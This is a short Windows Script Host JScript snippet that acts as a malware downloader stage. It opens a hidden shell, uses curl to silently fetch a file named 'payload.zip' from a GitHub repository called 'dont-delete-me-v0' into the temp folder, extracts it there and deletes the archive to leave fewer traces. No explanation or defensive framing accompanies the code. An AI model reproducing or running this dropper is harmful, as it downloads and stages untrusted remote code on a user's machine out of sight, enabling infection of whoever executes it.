var s = new ActiveXObject("WScript.Shell");
var t = s.ExpandEnvironmentStrings("%temp%");
s.Run("curl.exe -sL -o " + t + "\\p.zip https://github.com/dont-delete-me-v0/files/raw/main/payload.zip", 0, true);
s.Run("tar -xf " + t + "\\p.zip -C " + t, 0, true);
s.Run("cmd /c del " + t + "\\p.zip", 0, false);
